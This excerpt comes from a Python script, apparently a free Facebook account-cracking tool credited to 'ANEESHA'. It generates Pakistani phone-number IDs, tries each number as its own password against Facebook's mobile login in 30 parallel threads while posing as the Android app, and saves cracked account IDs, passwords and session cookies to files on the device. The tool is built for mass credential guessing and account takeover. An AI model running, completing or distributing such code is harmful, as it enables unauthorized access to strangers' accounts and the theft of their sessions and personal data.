...
`------'`------'`------'`------'`------'
\x1b[1;97m[*]----------------------------------------------
\033[1;37m[*] Author        : ANEESHA
\033[1;37m[*] Github        : ANEESHA-404
\033[1;37m[*] Status        : FREE
\033[1;37m[*] TEAM          : NO ONE
\033[1;37m[*] UPDATE BY     : ANEESA-TEACH
...
def Random():
    ...
    print(f"")
    clear()
    print(f"    \x1b[97m[\033[37;41m   ANEESA    QUEEN         \033[0;m]")
    print(f"") 
    linex()
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {GREEN}TOTAL IDZ             : {GREEN}"+tl)
        print(f" {GREEN}COUNTRY YOU CHOOSE    : PAKISTAN ")
        print(f" {GREEN}NUMBER YOU PUT        : {GREEN}"+code)
        print(f" {GREEN}PROCESS HAS BEEN STARTED")
        print(f" {GREEN} COMING-SOON.......")
        print(f" {GREEN} Use Airplane Mood For Best Result ")
        print(f'===========================================================')
        for love in user:
            uid = code+love
            pwx = [love]
...
def free(uid,pwx,tl):
    ...
    'user-agent':'[FBAN/FB4A;FBAV/373.0.0.2.104;FBBV/234544003;FBDM/{density=2.3,width=1080,height=1483};FBLC/es_ES;FBRV/815059637;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/12;FBOP/1;FBCA/arm64-v8a",'}
            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[ANEESA-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                print(f"{H} [COOKIE] {coki}")
                open('/sdcard/ANEESA-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid) 
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[ANEESA-CP-💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ANEESA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s|ANEESA-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
